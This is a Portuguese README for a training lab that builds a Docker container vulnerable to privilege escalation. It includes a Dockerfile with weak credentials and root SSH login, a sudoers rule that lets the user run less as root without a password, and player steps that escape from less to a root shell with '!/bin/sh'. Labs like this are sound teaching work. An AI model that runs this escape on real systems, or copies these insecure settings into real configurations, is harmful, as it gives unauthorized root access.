# Cenário 1 - Sudo with Less

Este cenário busca criar um ambiente Linux vulnerável a escalação de privilégio por meio da exploração de uma má configuração do comando ``sudo`` usando o leitor de texto ``less``.

**Sumário**

- [Estrutura do Cenário](#estrutura-do-cenário)
    - [Arquivo ``Dockerfile``](#arquivo-dockerfile)
    - [Arquivo ``sudoers.bob``](#arquivo-sudoersbob)
    - [Arquivo ``entrypoint.sh``](#arquivo-entrypointsh)
- [Como Iniciar e Interagir com o Cenário](#como-iniciar-e-interagir-com-o-cenário)
    - [Para Devs: Como criar a imagem e o contêiner](#para-devs-como-criar-a-imagem-e-o-contêiner)
    - [Para Jogadores: Como conectar-se ao cenário](#para-jogadores-como-conectar-se-ao-cenário)
    - [Para Jogadores: Como explorar a vulnerabilidade](#para-jogadores-como-explorar-a-vulnerabilidade)

## Estrutura do Cenário
Organização dos arquivos do cenário baseada na classificação da vulnerabilidade em foco no cenário:
```
Cenarios do jogo/
└── Linux Privilege Escalation/
    └── Sudo Exploitation/
        └── Shell Escaping/
            └── Cenario 1 - Sudo with Less/
                ├── Dockerfile
                ├── entrypoint.sh
                └── sudoers.bob
```

### Arquivo ``Dockerfile``
Este é o arquivo base a partir do qual a imagem Docker será criada.

```dockerfile
FROM ubuntu:22.04

# Instalar dependências
RUN apt-get update && \
    apt-get install -y sudo less openssh-server && \
    mkdir /var/run/sshd

# Criar usuário 'bob' e definir senha
RUN useradd -m -s /bin/bash bob && \
    echo 'bob:password' | chpasswd

# Configurar sudoers para permitir less como root sem senha
COPY sudoers.bob /etc/sudoers.d/bob
RUN chmod 0440 /etc/sudoers.d/bob

# Configurar SSH
RUN echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && \
    echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config

# Copiar e configurar script de inicialização
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 22
ENTRYPOINT ["/entrypoint.sh"]
```

### Arquivo ``sudoers.bob``

Este é o arquivo de configuração do ``sudo`` que será usado no cenário. Ele permite ao usuário ``bob`` executar o comando ``less`` sem senha e com os privilégios administrativos (do superusuário root). [O que é o sudo?](https://wood-viscose-668.notion.site/Adm-de-SO-e-Virtualiza-o-1136525f266c806da479f9c8811c53e8#12a6525f266c80a5b070ea77172f3eae)

```
bob ALL=(ALL) NOPASSWD: /usr/bin/less
```

### Arquivo ``entrypoint.sh``

Este arquivo será executado quando o contêiner for iniciado. Ele inicia o serviço SSH e mantém o container em execução com um shell interativo.

```bash
#!/bin/bash

# Iniciar o serviço SSH
service ssh start

# Manter o container em execução com shell interativo
exec /bin/bash
```

## Como Iniciar e Interagir com o Cenário

### Para Devs: Como criar a imagem e o contêiner

1 - Certifique-se de estar na pasta ``Cenario 1 - Sudo with Less/`` (ou informe o caminho completo para o ``Dockerfile`` posteriormente):
```bash
cd Cenario 1 - Sudo with Less/
```

2 - Crie a imagem a partir do ``Dockerfile``:
```bash
docker build -t scenario-sudo-1-image -f Dockerfile .
```
- Você pode confirmar a criação da imagem por meio do comando:
    ```bash
    docker images
    ```
- Caso a criação seja bem-sucedida, você deverá ver a seguinte linha na saída:
    ```bash
    REPOSITORY              TAG       IMAGE ID       CREATED       SIZE
    scenario-sudo-1-image   latest    5b4e0b6f3160   9 days ago    253MB
    ```

3 - Crie o contêiner a partir da imagem e mapeie a porta 2222 do host para a porta 22 do contêiner:
```bash
docker run -id --rm --name scenario-sudo-1-container -p 2222:22 scenario-sudo-1-image
```
- Você pode confirmar a criação do contêiner por meio do comando:
    ```bash
    docker ps
    ```
- Caso a criação seja bem-sucedida, você deverá ver a seguinte linha na saída:
    ```bash
    CONTAINER ID   IMAGE                   COMMAND            CREATED         STATUS         PORTS                                   NAMES
    f278c16ce233   scenario-sudo-1-image   "/entrypoint.sh"   5 seconds ago   Up 2 seconds   0.0.0.0:2222->22/tcp, :::2222->22/tcp   scenario-sudo-1-container
    ```

### Para Jogadores: Como conectar-se ao cenário
Acesse o cenário via SSH com as credenciais ``bob:password``
```bash
ssh bob@localhost -p 2222
```

### Para Jogadores: Como explorar a vulnerabilidade
1 - Enumeração: Busque no sistema informações que indiquem a vulnerabilidade em questão.
```bash
sudo -l
```

2 - Como explorar a falha:
```bash
sudo less <any_filename>  # por exemplo: /etc/hosts
```

2.1 - Dentro do less, digite:
```bash
!/bin/sh
```
Parabéns, agora você tem acesso total ao sistema!
    